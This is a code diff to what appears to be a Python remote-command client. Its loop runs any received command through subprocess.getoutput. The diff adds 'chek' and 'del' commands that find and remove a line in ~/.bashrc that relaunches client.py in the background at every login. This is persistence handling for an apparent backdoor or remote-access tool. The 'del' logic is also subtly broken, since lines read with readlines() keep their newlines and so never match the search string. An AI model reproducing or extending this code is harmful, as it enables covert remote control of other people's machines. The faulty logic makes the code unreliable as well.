@@ -61,6 +61,53 @@ while True:
                 except Exception as e:
                     # if there's an error, set the output to the error message
                     output = str(e)
+            elif splited_command[0].lower() == "chek":
+                # get the current working directory
+                cwd = os.getcwd()
+                # create the command to check in .bashrc
+                command_to_check = f"python3 {cwd}/client.py &"
+                # path to the .bashrc file
+                bashrc_path = os.path.expanduser("~/.bashrc")
+                try:
+                    # open the .bashrc file in read mode
+                    with open(bashrc_path, "r") as file:
+                        # read the contents of the .bashrc file
+                        contents = file.read()
+                    # check if the command is in the .bashrc file
+                    if command_to_check in contents:
+                        output = "The command is in the .bashrc file."
+                    else:
+                        output = "The command is not in the .bashrc file."
+                except Exception as e:
+                    # if there's an error, set the output to the error message
+                    output = str(e)
+            elif splited_command[0].lower() == "del":
+                # get the current working directory
+                cwd = os.getcwd()
+                # create the command to search in .bashrc
+                command_to_search = f"python3 {cwd}/client.py &"
+                # path to the .bashrc file
+                bashrc_path = os.path.expanduser("~/.bashrc")
+                try:
+                    # open the .bashrc file in read mode
+                    with open(bashrc_path, "r") as file:
+                        # read the contents of the .bashrc file
+                        contents = file.readlines()
+                    # check if the command is in the .bashrc file
+                    if command_to_search in contents:
+                        # remove the line containing the command
+                        contents.remove(command_to_search)
+                        # open the .bashrc file in write mode
+                        with open(bashrc_path, "w") as file:
+                            # write the updated contents to the .bashrc file
+                            file.writelines(contents)
+                        output = "Command removed from .bashrc successfully!"
+                    else:
+                        output = "The command is not in the .bashrc file."
+                except Exception as e:
+                    # if there's an error, set the output to the error message
+                    output = str(e)
+
             else:
                 # execute the command and retrieve the results
                 output = subprocess.getoutput(command)
